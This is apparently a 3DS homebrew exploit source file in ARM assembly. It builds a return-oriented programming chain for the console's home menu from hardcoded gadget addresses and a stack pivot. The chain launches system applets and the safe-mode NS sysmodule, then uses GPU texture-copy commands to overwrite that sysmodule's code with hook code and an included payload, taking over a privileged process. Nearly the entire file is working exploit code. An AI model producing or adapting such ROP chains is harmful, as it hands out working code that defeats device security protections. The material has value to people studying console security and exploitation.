.nds

.include "../../build/constants.s"

.create "menu_ropbin.bin",0x0

MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR

MENU_STACK_PIVOT equ 0x00100fdc ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ 0x001575F0 ; pop {pc}
MENU_NSS_REBOOT equ 0x00139874 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
MENU_NSS_HANDLE equ 0x002F0F98
MENU_PAD equ 0x1000001C
MENU_KEYCOMBO equ 0x00000008 ; START
MENU_SLEEP equ 0x0012E64C

MENU_NSS_LAUNCHTITLE equ 0x0020E640 ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
MENU_GSPGPU_FLUSHDATACACHE equ 0x0014D55C ; r0 : address, r1 : size
MENU_GSPGPU_GXTRYENQUEUE equ 0x001F5F10 ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
MENU_GSPGPU_WRITEHWREG equ 0x0014D884 ; r0 : gpu reg offset, r1 : data ptr, r2 : size
MENU_MEMCPY equ 0x00213318 ; r0 : dst, r1 : src, r2 : size

GPU_REG_BASE equ 0x1EB00000

SNS_CODE_OFFSET equ 0x0001D300

.macro set_lr,_lr
	.word 0x001575ac ; pop {r0, pc}
		.word MENU_NOP ; pop {pc}
	.word 0x0015d048 ; pop {r4, lr} ; bx r0
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro nss_launch_title,tidlow,tidhigh
	set_lr 0x00101c74 ; pop {r4, pc}
	.word 0x001575ac ; pop {r0, pc}
		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
		.word tidlow ; r2 (tid low) 
		.word tidhigh ; r3 (tid high)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_NSS_LAUNCHTITLE
		.word 0x00000001 ; sp_0 (flag)
.endmacro

.macro memcpy,dst,src,size
	set_lr MENU_NOP
	.word 0x001575ac ; pop {r0, pc}
		.word dst ; r0 (out ptr)
	.word 0x00214988 ; pop {r1, pc}
		.word src ; r1 (src)
	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_MEMCPY
.endmacro

.macro flush_dcache,addr,size
	set_lr MENU_NOP
	.word 0x001575ac ; pop {r0, pc}
		.word addr ; r0 (out ptr)
	.word 0x00214988 ; pop {r1, pc}
		.word size ; r1 (src)
	.word MENU_GSPGPU_FLUSHDATACACHE
.endmacro

.macro write_gpu_reg,offset,data,size
	set_lr MENU_NOP
	.word 0x001575ac ; pop {r0, pc}
		.word offset ; r0 (out ptr)
	.word 0x00214988 ; pop {r1, pc}
		.word data ; r1 (src)
	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_WRITEHWREG
.endmacro

.macro send_gx_cmd,cmd_data
	set_lr MENU_NOP
	.word 0x001575ac ; pop {r0, pc}
		.word 0x002EF580+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word 0x00214988 ; pop {r1, pc}
		.word cmd_data ; r1 (cmd addr)
	.word MENU_GSPGPU_GXTRYENQUEUE
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr MENU_NOP
	.word 0x001575ac ; pop {r0, pc}
		.word nanosec_low ; r0
	.word 0x00214988 ; pop {r1, pc}
		.word nanosec_high ; r1
	.word MENU_SLEEP
.endmacro

.macro infloop
	set_lr 0x00207080 ; bx lr
	.word 0x00207080 ; bx lr
.endmacro

.orga 0x0

	object:
	rop: ; real ROP starts here
		; launch titles to fill space
			nss_launch_title 0x20008802, 0x00040030 ; launch SKATER applet
			nss_launch_title 0x0000c002, 0x00040030 ; launch swkbd applet
			nss_launch_title 0x00008d02, 0x00040030 ; launch friend applet

		; launch sns
			nss_launch_title 0x20008003, 0x00040130 ; launch safe mode ns sysmodule

		; take over sns
			send_gx_cmd MENU_OBJECT_LOC + gxCommandHook - object
			send_gx_cmd MENU_OBJECT_LOC + gxCommandCode - object

		; sleep for a bit
			sleep 100*1000*1000, 0x00000000

		; sleep for ever and ever
			sleep 0xffffffff, 0x0fffffff

		; infinite loop just in case
			infloop

		;crash
			.word 0xDEADBABE

	; copy hook code over safe ns .text
	.align 0x4
	gxCommandHook:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + snsCodeHook - object ; source address
		.word 0x3D010000 + 0x00000320 ; destination address (hook main)
		.word 0x00000200 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	gxCommandCode:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + snsCode - object ; source address
		.word 0x3D00D300 ; destination address (PA  for 0x0011D300)
		.word 0x00000D00 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x20
	snsCodeHook:
		.arm
			nop
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
			b snsHook2
		.pool

		.fill ((snsCodeHook + 0x00100400 - 0x00100320) - .), 0xDA

			snsHook2:
			ldr r0, =100*1000*1000 ; 100ms
			ldr r1, =0x00000000
			.word 0xef00000a ; svcSleepThread
			ldr r2, =0x00100000 + 0x0001D300
			blx r2

		.pool

		.fill ((snsCodeHook + 0x200) - .), 0xDA
	
		snsCode:
			.incbin "../sns_code.bin"

.Close
